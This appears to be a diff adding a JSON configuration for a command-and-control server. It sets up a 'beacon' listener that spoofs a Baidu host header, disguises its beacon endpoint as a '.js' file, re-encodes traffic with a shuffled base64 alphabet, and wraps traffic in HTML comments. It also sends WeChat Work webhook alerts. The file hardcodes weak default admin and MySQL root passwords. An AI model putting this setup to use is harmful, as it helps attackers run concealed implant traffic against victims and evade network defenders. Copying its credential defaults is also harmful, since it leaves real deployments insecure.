@@ -1,0 +1,67 @@
+{
+  "db_path": "",
+  "admin_user": "admin",
+  "admin_pass": "admin123",
+  "client_token": "QWERTYUIOPASDF",
+  "jwt_secret": "JWT-Secret-Key-2025-Change-This-In-Production",
+  "webhook_url": "https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=",
+  "webhook_key": "",
+  "webhook_enable": true,
+  "api_endpoint": "",
+  "database": {
+    "type": "mysql",
+    "mysql": {
+      "host": "127.0.0.1",
+      "port": 3306,
+      "user": "root",
+      "password": "root123",
+      "dbname": "new1",
+      "params": "charset=utf8mb4\u0026parseTime=true\u0026loc=Local"
+    },
+    "max_open_conns": 50,
+    "max_idle_conns": 10,
+    "conn_max_lifetime": 300
+  },
+  "server": {
+    "host": "0.0.0.0",
+    "port": 18080,
+    "read_timeout": 60,
+    "write_timeout": 60,
+    "max_body_size": 10,
+    "enable_https": false,
+    "https_port": 8443,
+    "cert_file": "./certs/server.crt",
+    "key_file": "./certs/server.key",
+    "host_header": "",
+    "listeners": [
+      {
+        "host": "0.0.0.0",
+        "port": 8083,
+        "host_header": "www.baidu.com",
+        "type": "beacon"
+      },
+      {
+        "host": "0.0.0.0",
+        "port": 18081,
+        "host_header": "0.0.0.0",
+        "type": "admin"
+      }
+    ]
+  },
+  "routes": {
+    "admin_prefix": "/websafe/admin",
+    "api_prefix": "/websafe/api",
+    "beacon_endpoint": "/asdasd/j.js",
+    "register_path": "/sync_debug",
+    "login_path": "/login"
+  },
+  "encoding": {
+    "custom_base64_table": "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm0123456789+/",
+    "use_custom_base64": true
+  },
+  "traffic_disguise": {
+    "enable": true,
+    "prefix": "\u003c!--",
+    "suffix": "--\u003e"
+  }
+}
